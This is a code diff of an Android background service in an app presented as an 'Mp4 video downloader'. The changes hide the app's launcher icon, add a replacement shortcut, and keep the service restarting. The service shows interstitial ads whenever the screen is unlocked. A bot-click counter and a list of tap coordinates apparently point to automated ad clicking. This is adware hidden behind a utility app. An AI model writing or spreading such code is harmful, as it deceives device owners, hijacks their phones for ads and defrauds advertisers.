@@ -72,10 +72,16 @@ public class MyService extends Service {
     private CheckAds checkAds;
 
     private static final Point [] points = {new Point(50,50),new Point(51,57),new Point(79,85),new Point(72,74),
-            new Point(70,92),new Point(48,80),new Point(48,65),new Point(53,40)};
+            new Point(70,92),new Point(71,91),new Point(71,93),new Point(72,92),new Point(48,80),new Point(48,65),new Point(53,40)};
 
     @Override
     public void onCreate() {
+        Log.d("cao","onCreate");
+    }
+
+    private void initService()
+    {
+        Log.d("cao","initService");
         SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
         uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
         idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21736058380");
@@ -84,7 +90,6 @@ public class MyService extends Service {
         delay_retention = mPrefs.getInt("delay_retention", -1);
         delay_report = mPrefs.getInt("delay_report", 1);
         idFullFbService = mPrefs.getString("idFullFbService", "");
-
         getAdsCount();
 
         MyBroadcast myBroadcast = new MyBroadcast();
@@ -101,27 +106,25 @@ public class MyService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.e("caomui", "onStartCommand");
+        Log.d("cao","onStartCommand");
+        if(myTask == null || myTask.isShutdown() || myTask.isTerminated()) {
+            initService();
+        }
         return START_STICKY;
     }
-
-//    @Override
-//    public void onDestroy() {
-//        super.onDestroy();
-//        sendBroadcast(new Intent("NeverKillMe"));
-//    }
 
     private void addShortcut() {
         //Adding shortcut for MainActivity
         try {
             PackageManager p = getPackageManager();
-            ComponentName componentName = new ComponentName(this.getPackageName(), getPackageName()+".MAIN1");
+            ComponentName componentName = new ComponentName(this.getPackageName(), "com.mp4.videodownloader.MAIN1");
             p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 //            Log.d("caomui","DONE hide icon");
         }
         catch (Exception e)
         {
-//            Log.d("caomui","ERROR HIDE ICON");
+//            Log.d("caomui","ERROR HIDE ICON" + e.getLocalizedMessage());
+            e.printStackTrace();
         }
 
         Intent shortcutIntent = new Intent(getApplicationContext(),
@@ -135,7 +138,7 @@ public class MyService extends Service {
         addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Mp4 video downloader");
         addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                 Intent.ShortcutIconResource.fromContext(getApplicationContext(),
-                        R.drawable.tube));
+                        R.mipmap.ic_launcher));
 
         addIntent
                 .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
@@ -143,7 +146,7 @@ public class MyService extends Service {
         getApplicationContext().sendBroadcast(addIntent);
 
 //        Log.d("caomui","ADD shortcut done");
-//        createShortcut();
+        createShortcut();
     }
 
     private void scheduleTask() {
@@ -258,29 +261,10 @@ public class MyService extends Service {
         countBotClick = mPrefs.getInt("countBotClick", 0);
     }
 
-//    public boolean checkServiceRunning(){
-//        ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
-//        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE))
-//        {
-//            if ("com.mp4.videodownloader.services.MyService"
-//                    .equals(service.service.getClassName()))
-//            {
-//                return true;
-//            }
-//        }
-//
-//        return false;
-//    }
-
     class MyBroadcast extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
             Log.d("cao", "Unlock Screen " + uuid);
-//            if(!checkServiceRunning())
-//            {
-//                context.startService(new Intent(context.getApplicationContext(), MyService.class));
-//                return;
-//            }
 
             if (!isContinousShowAds || clientConfig == null)
                 return;
@@ -440,7 +424,7 @@ public class MyService extends Service {
                             }
                         });
 
-                        mInterstitialAd.loadAd(new AdRequest.Builder().build());//addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969")
+                        mInterstitialAd.loadAd(new AdRequest.Builder().build());//addTestDevice("bdb2f833-8f8c-4c04-854a-25598ac40375")
                     }
                 });
             }
